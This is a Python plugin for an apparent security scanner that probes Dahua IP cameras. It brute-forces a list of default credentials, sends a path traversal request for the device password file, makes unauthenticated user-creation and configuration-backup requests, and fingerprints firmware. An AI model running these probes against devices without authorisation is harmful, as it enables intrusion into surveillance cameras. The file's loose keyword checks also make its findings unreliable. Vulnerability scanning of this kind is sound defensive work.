"""
Dahua Camera Vulnerability Scanner Plugin

Comprehensive vulnerability detection for Dahua IP cameras including:
- Default credential detection
- Authentication bypass vulnerabilities
- Command injection flaws
- Information disclosure vulnerabilities
- Firmware-specific exploits
"""

import asyncio
import aiohttp
import json
import hashlib
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin

from gridland.analyze.plugins.manager import VulnerabilityPlugin, PluginMetadata
from gridland.analyze.memory import get_memory_pool
from gridland.core.logger import get_logger

logger = get_logger(__name__)


class DahuaScanner(VulnerabilityPlugin):
    """Professional Dahua camera vulnerability scanner."""
    
    def __init__(self):
        super().__init__()
        self.metadata = PluginMetadata(
            name="Dahua Scanner",
            version="1.0.0",
            author="GRIDLAND Security Team",
            plugin_type="vulnerability",
            supported_ports=[80, 443, 8080, 8000, 8443, 37777],
            supported_services=["http", "https"],
            description="Comprehensive Dahua camera vulnerability scanner"
        )
        self.memory_pool = get_memory_pool()
        self.session = None
        
        # Common Dahua default credentials
        self.default_credentials = [
            ('admin', 'admin'),
            ('admin', '123456'),
            ('admin', 'password'),
            ('admin', ''),
            ('root', 'root'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('admin', 'dahua123'),
            ('admin', '888888'),
            ('666666', '666666'),
        ]
        
        # Dahua-specific URI paths
        self.test_paths = {
            'login': '/RPC2_Login',
            'config': '/RPC2',
            'device_info': '/cgi-bin/magicBox.cgi?action=getSystemInfo',
            'device_type': '/cgi-bin/magicBox.cgi?action=getDeviceType',
            'users': '/cgi-bin/configManager.cgi?action=getConfig&name=AccessControl',
            'network': '/cgi-bin/configManager.cgi?action=getConfig&name=Network',
            'backup': '/cgi-bin/configManager.cgi?action=backup',
            'restore': '/cgi-bin/configManager.cgi?action=restore',
        }
        
        # Known vulnerability signatures
        self.vulnerability_signatures = {
            'CVE-2021-33045': {
                'path': '/cgi-bin/snapManager.cgi?action=attachFileProc&Intruder=/../../../../../../../mnt/mtd/Config/passwd',
                'method': 'GET',
                'description': 'Path traversal in snapManager.cgi',
                'severity': 'HIGH'
            },
            'CVE-2020-25078': {
                'path': '/cgi-bin/user_add.cgi',
                'method': 'POST',
                'description': 'Authentication bypass in user management',
                'severity': 'CRITICAL'
            },
            'CVE-2019-3949': {
                'path': '/cgi-bin/magicBox.cgi?action=getSystemInfo',
                'method': 'GET',
                'description': 'Information disclosure without authentication',
                'severity': 'MEDIUM'
            }
        }
        
        # Dahua session management
        self.session_id = None
        self.auth_token = None
    
    async def _init_session(self):
        """Initialize HTTP session if not already done."""
        if not self.session:
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False, limit=100)
            self.session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers={'User-Agent': 'GRIDLAND Security Scanner v3.0'}
            )
    
    async def _cleanup_session(self):
        """Clean up HTTP session."""
        if self.session:
            await self.session.close()
            self.session = None
        self.session_id = None
        self.auth_token = None
    
    async def scan_vulnerabilities(self, target_ip: str, target_port: int, 
                                 service: str, banner: str) -> List[Any]:
        """
        Scan for Dahua-specific vulnerabilities.
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            service: Service type (http/https)
            banner: Service banner
            
        Returns:
            List of VulnerabilityResult objects
        """
        results = []
        
        # Only scan if this looks like a Dahua device
        if not self._is_dahua_device(banner):
            return results
        
        await self._init_session()
        
        try:
            base_url = f"{'https' if service == 'https' or target_port == 443 else 'http'}://{target_ip}:{target_port}"
            
            # Test for default credentials
            cred_vulns = await self._test_default_credentials(base_url, target_ip, target_port)
            results.extend(cred_vulns)
            
            # Test for authentication bypass vulnerabilities
            bypass_vulns = await self._test_auth_bypass(base_url, target_ip, target_port)
            results.extend(bypass_vulns)
            
            # Test for known CVE exploits
            cve_vulns = await self._test_known_cves(base_url, target_ip, target_port)
            results.extend(cve_vulns)
            
            # Test for information disclosure
            info_vulns = await self._test_info_disclosure(base_url, target_ip, target_port)
            results.extend(info_vulns)
            
            # Test for configuration access
            config_vulns = await self._test_config_access(base_url, target_ip, target_port)
            results.extend(config_vulns)
            
        except Exception as e:
            logger.warning(f"Error scanning Dahua device {target_ip}:{target_port}: {e}")
        
        finally:
            await self._cleanup_session()
        
        return results
    
    def _is_dahua_device(self, banner: str) -> bool:
        """Check if banner indicates Dahua device."""
        dahua_indicators = [
            'dahua',
            'dh-',  # Dahua model prefix
            'nvr-',
            'ipc-',  # IP Camera prefix
            'DAHUA',
            'DahuaHTTP',
            'Dahua-HTTP',
            'DH_WEB',
            'Webs'  # Dahua web server
        ]
        
        banner_lower = banner.lower()
        return any(indicator.lower() in banner_lower for indicator in dahua_indicators)
    
    async def _test_default_credentials(self, base_url: str, target_ip: str, target_port: int) -> List[Any]:
        """Test for default credential vulnerabilities."""
        results = []
        
        for username, password in self.default_credentials:
            try:
                # Test Dahua RPC2 login
                login_success = await self._test_rpc2_login(base_url, username, password)
                if login_success:
                    vuln = self.memory_pool.acquire_vulnerability_result()
                    vuln.ip = target_ip
                    vuln.port = target_port
                    vuln.service = "http"
                    vuln.vulnerability_id = "DAHUA-DEFAULT-CREDS"
                    vuln.severity = "CRITICAL"
                    vuln.confidence = 0.95
                    vuln.description = f"Default credentials found: {username}/{password}"
                    vuln.exploit_available = True
                    results.append(vuln)
                    break  # Found working creds, no need to test more
                
                # Test CGI authentication
                cgi_success = await self._test_cgi_auth(base_url, username, password)
                if cgi_success:
                    vuln = self.memory_pool.acquire_vulnerability_result()
                    vuln.ip = target_ip
                    vuln.port = target_port
                    vuln.service = "http"
                    vuln.vulnerability_id = "DAHUA-CGI-DEFAULT-CREDS"
                    vuln.severity = "CRITICAL"
                    vuln.confidence = 0.95
                    vuln.description = f"CGI default credentials: {username}/{password}"
                    vuln.exploit_available = True
                    results.append(vuln)
                    break
                    
            except Exception as e:
                logger.debug(f"Credential test error for {username}/{password}: {e}")
                continue
        
        return results
    
    async def _test_rpc2_login(self, base_url: str, username: str, password: str) -> bool:
        """Test Dahua RPC2 authentication."""
        login_url = urljoin(base_url, '/RPC2_Login')
        
        try:
            # Step 1: Get challenge
            challenge_data = {
                "method": "global.login",
                "params": {
                    "userName": username,
                    "password": "",
                    "clientType": "Web3.0"
                },
                "id": 1
            }
            
            async with self.session.post(login_url, json=challenge_data) as response:
                if response.status != 200:
                    return False
                
                result = await response.json()
                if result.get('result', False):
                    # No challenge needed, already authenticated
                    self.session_id = result.get('session', '')
                    return True
                
                # Extract challenge parameters
                error = result.get('error', {})
                challenge = error.get('message', '')
                realm = error.get('code', '')
                
                if not challenge:
                    return False
                
                # Step 2: Calculate response hash
                pass_hash = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest().upper()
                response_hash = hashlib.md5(f"{username}:{challenge}:{pass_hash}".encode()).hexdigest().upper()
                
                # Step 3: Login with response
                login_data = {
                    "method": "global.login",
                    "params": {
                        "userName": username,
                        "password": response_hash,
                        "clientType": "Web3.0"
                    },
                    "id": 2
                }
                
                async with self.session.post(login_url, json=login_data) as login_response:
                    if login_response.status == 200:
                        login_result = await login_response.json()
                        if login_result.get('result', False):
                            self.session_id = login_result.get('session', '')
                            return True
                            
        except Exception as e:
            logger.debug(f"RPC2 login error: {e}")
            return False
        
        return False
    
    async def _test_cgi_auth(self, base_url: str, username: str, password: str) -> bool:
        """Test CGI authentication."""
        cgi_url = urljoin(base_url, '/cgi-bin/magicBox.cgi?action=getSystemInfo')
        
        try:
            auth = aiohttp.BasicAuth(username, password)
            async with self.session.get(cgi_url, auth=auth) as response:
                if response.status == 200:
                    content = await response.text()
                    # Check for system info response
                    return any(indicator in content.lower() for indicator in 
                              ['devicetype', 'serialnumber', 'version', 'builddate'])
                    
        except Exception:
            return False
        
        return False
    
    async def _test_auth_bypass(self, base_url: str, target_ip: str, target_port: int) -> List[Any]:
        """Test for authentication bypass vulnerabilities."""
        results = []
        
        bypass_tests = [
            # CVE-2020-25078 style bypass
            {
                'path': '/cgi-bin/user_add.cgi',
                'method': 'POST',
                'data': '{"method":"user.factory.create","params":{"test":"test"}}',
                'vulnerability_id': 'CVE-2020-25078',
                'description': 'Authentication bypass in user management'
            },
            # Configuration access without auth
            {
                'path': '/cgi-bin/configManager.cgi?action=getConfig&name=General',
                'method': 'GET',
                'vulnerability_id': 'DAHUA-CONFIG-BYPASS',
                'description': 'Unauthenticated configuration access'
            },
            # Backup access without auth
            {
                'path': '/cgi-bin/configManager.cgi?action=backup',
                'method': 'GET',
                'vulnerability_id': 'DAHUA-BACKUP-BYPASS',
                'description': 'Unauthenticated backup access'
            }
        ]
        
        for test in bypass_tests:
            try:
                test_url = urljoin(base_url, test['path'])
                
                if test['method'] == 'GET':
                    async with self.session.get(test_url) as response:
                        vulnerable = await self._check_bypass_response(response, test)
                elif test['method'] == 'POST':
                    headers = {'Content-Type': 'application/json'}
                    data = test.get('data', '{}')
                    async with self.session.post(test_url, data=data, headers=headers) as response:
                        vulnerable = await self._check_bypass_response(response, test)
                else:
                    continue
                
                if vulnerable:
                    vuln = self.memory_pool.acquire_vulnerability_result()
                    vuln.ip = target_ip
                    vuln.port = target_port
                    vuln.service = "http"
                    vuln.vulnerability_id = test['vulnerability_id']
                    vuln.severity = "HIGH"
                    vuln.confidence = 0.85
                    vuln.description = test['description']
                    vuln.exploit_available = True
                    results.append(vuln)
                    
            except Exception as e:
                logger.debug(f"Auth bypass test error for {test['path']}: {e}")
                continue
        
        return results
    
    async def _check_bypass_response(self, response, test: Dict[str, str]) -> bool:
        """Check if response indicates successful bypass."""
        if response.status not in [200, 500]:
            return False
        
        content = await response.text()
        
        # Look for successful access indicators
        success_indicators = [
            'table.general', 'table.', 'config', 'password',
            'serialnumber', 'version', 'admin', 'user'
        ]
        
        return any(indicator in content.lower() for indicator in success_indicators)
    
    async def _test_known_cves(self, base_url: str, target_ip: str, target_port: int) -> List[Any]:
        """Test for known CVE vulnerabilities."""
        results = []
        
        for cve_id, cve_data in self.vulnerability_signatures.items():
            try:
                test_url = urljoin(base_url, cve_data['path'])
                
                if cve_data['method'] == 'GET':
                    async with self.session.get(test_url) as response:
                        vulnerable = await self._check_cve_response(response, cve_id)
                elif cve_data['method'] == 'POST':
                    test_data = '{"test": "value"}'
                    async with self.session.post(test_url, data=test_data) as response:
                        vulnerable = await self._check_cve_response(response, cve_id)
                else:
                    continue
                
                if vulnerable:
                    vuln = self.memory_pool.acquire_vulnerability_result()
                    vuln.ip = target_ip
                    vuln.port = target_port
                    vuln.service = "http"
                    vuln.vulnerability_id = cve_id
                    vuln.severity = cve_data['severity']
                    vuln.confidence = 0.80
                    vuln.description = cve_data['description']
                    vuln.exploit_available = True
                    results.append(vuln)
                    
            except Exception as e:
                logger.debug(f"CVE test error for {cve_id}: {e}")
                continue
        
        return results
    
    async def _check_cve_response(self, response, cve_id: str) -> bool:
        """Check if response indicates vulnerability."""
        if response.status not in [200, 500]:
            return False
        
        content = await response.text()
        
        # CVE-specific indicators
        cve_indicators = {
            'CVE-2021-33045': ['passwd', 'root:', 'admin:', '/mnt/'],
            'CVE-2020-25078': ['result', 'success', 'user'],
            'CVE-2019-3949': ['devicetype', 'serialnumber', 'version']
        }
        
        indicators = cve_indicators.get(cve_id, [])
        return any(indicator in content.lower() for indicator in indicators)
    
    async def _test_info_disclosure(self, base_url: str, target_ip: str, target_port: int) -> List[Any]:
        """Test for information disclosure vulnerabilities and perform fingerprinting."""
        results = []
        
        info_paths = {
            '/cgi-bin/magicBox.cgi?action=getSystemInfo': self._parse_system_info,
            '/cgi-bin/magicBox.cgi?action=getDeviceType': self._parse_system_info,
            '/cgi-bin/magicBox.cgi?action=getSoftwareVersion': self._parse_system_info,
        }
        
        for path, parser in info_paths.items():
            try:
                test_url = urljoin(base_url, path)
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Use specific parser for fingerprinting
                        fingerprint_vuln = parser(content, target_ip, target_port, path)
                        if fingerprint_vuln:
                            results.append(fingerprint_vuln)
                            # Got a good fingerprint, we can stop
                            return results
                        
                        # Generic check for sensitive information
                        sensitive_patterns = [
                            'devicetype', 'serialnumber', 'version', 'builddate',
                            'hardwareversion', 'encryptionversion', 'macaddress',
                            'ipaddress', 'admin', 'password'
                        ]
                        
                        if any(pattern in content.lower() for pattern in sensitive_patterns):
                            vuln = self.memory_pool.acquire_vulnerability_result()
                            vuln.ip = target_ip
                            vuln.port = target_port
                            vuln.service = "http"
                            vuln.vulnerability_id = "DAHUA-INFO-DISCLOSURE"
                            vuln.severity = "MEDIUM"
                            vuln.confidence = 0.70
                            vuln.description = f"Information disclosure at {path}"
                            vuln.exploit_available = False
                            results.append(vuln)
                            
            except Exception as e:
                logger.debug(f"Info disclosure test error for {path}: {e}")
                continue
        
        return results

    def _parse_system_info(self, content: str, ip: str, port: int, path: str) -> Optional[Any]:
        """Parse Dahua's key-value system info format."""
        try:
            lines = content.strip().split('\n')
            info = dict(line.split('=') for line in lines if '=' in line)
            
            device_type = info.get('DeviceType')
            serial = info.get('SerialNumber')
            version = info.get('SoftwareVersion')

            if device_type or serial or version:
                vuln = self.memory_pool.acquire_vulnerability_result()
                vuln.ip = ip
                vuln.port = port
                vuln.service = "http"
                vuln.vulnerability_id = "DAHUA-FINGERPRINT"
                vuln.severity = "INFO"
                vuln.confidence = 0.98
                description = f"Dahua device fingerprinted at {path}."
                if device_type:
                    description += f" Type: {device_type}."
                if serial:
                    description += f" Serial: {serial}."
                if version:
                    description += f" Version: {version}."
                vuln.description = description
                vuln.exploit_available = False
                return vuln
        except Exception as e:
            logger.debug(f"Could not parse Dahua system info: {e}")
        return None
    
    async def _test_config_access(self, base_url: str, target_ip: str, target_port: int) -> List[Any]:
        """Test for unauthorized configuration access."""
        results = []
        
        config_paths = [
            '/cgi-bin/configManager.cgi?action=getConfig&name=AccessControl',
            '/cgi-bin/configManager.cgi?action=getConfig&name=Network',
            '/cgi-bin/configManager.cgi?action=getConfig&name=General',
            '/cgi-bin/configManager.cgi?action=backup',
        ]
        
        for path in config_paths:
            try:
                test_url = urljoin(base_url, path)
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for configuration data
                        config_patterns = [
                            'table.', 'config', 'password', 'admin',
                            'accesscontrol', 'network', 'general'
                        ]
                        
                        if any(pattern in content.lower() for pattern in config_patterns):
                            vuln = self.memory_pool.acquire_vulnerability_result()
                            vuln.ip = target_ip
                            vuln.port = target_port
                            vuln.service = "http"
                            vuln.vulnerability_id = "DAHUA-CONFIG-ACCESS"
                            vuln.severity = "HIGH"
                            vuln.confidence = 0.80
                            vuln.description = f"Unauthorized configuration access at {path}"
                            vuln.exploit_available = True
                            results.append(vuln)
                            break  # Only report once per device
                            
            except Exception as e:
                logger.debug(f"Config access test error for {path}: {e}")
                continue
        
        return results


# Plugin instance for automatic discovery
dahua_scanner = DahuaScanner()